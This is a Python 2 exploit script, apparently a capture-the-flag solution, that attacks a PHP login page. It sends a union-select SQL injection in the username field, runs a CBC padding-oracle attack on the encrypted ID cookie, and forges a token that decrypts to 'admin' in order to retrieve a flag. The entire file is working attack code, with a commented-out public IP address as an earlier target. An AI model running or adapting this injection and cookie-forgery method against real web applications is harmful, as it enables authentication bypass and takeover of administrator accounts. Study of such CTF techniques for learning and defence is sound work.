import requests
import base64
import time
# url='http://218.2.197.235:23737/'
url='http://127.0.0.1:9090/src/'
N=16
phpsession=""
ID=""
def inject1(password):
    param={'username':"' union select 'bendawangbendawangbendawang','{password}".format(password=password),'password':''}
    result=requests.post(url,data=param)
    #print result.content
    return result

def inject_token(token):
    header={"Cookie":"PHPSESSID="+phpsession+";token="+token+";ID="+ID}
    result=requests.post(url,headers=header)
    return result

def xor(a, b):
    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])

def pad(string,N):
    l=len(string)
    if l!=N:
        return string+chr(N-l)*(N-l)

def padding_oracle(N,cipher):
    get=""
    for i in xrange(1,N+1):
        for j in xrange(0,256):
            padding=xor(get,chr(i)*(i-1))
            c=chr(0)*(16-i)+chr(j)+padding+cipher
            print c.encode('hex')
            result=inject1(base64.b64encode(chr(0)*16+c))
            if "ctfer" not in result.content:
                get=chr(j^i)+get
                # time.sleep(0.1)
                break
    return get

session=inject1("bendawang").headers['set-cookie'].split(',')
phpsession=session[0].split(";")[0][10:]
print phpsession
ID=session[1][4:].replace("%3D",'=').replace("%2F",'/').replace("%2B",'+').decode('base64')
token=session[2][6:].replace("%3D",'=').replace("%2F",'/').replace("%2B",'+').decode('base64')

middle=""
middle=padding_oracle(N,ID)
print "ID:"+ID.encode('base64')
print "token:"+token.encode('base64')
print "middle:"+middle.encode('base64')
print "\n"
if(len(middle)==16):
    plaintext=xor(middle,token)
    print plaintext
    print plaintext.encode('base64')
    des=pad('admin',N)
    tmp=""
    print des.encode("base64")
    for i in xrange(16):
        tmp+=chr(ord(token[i])^ord(plaintext[i])^ord(des[i])) 
    print tmp.encode('base64')

    result=inject_token(base64.b64encode(tmp))
    print result.content
    if "flag" in result.content :
        raw_input("success")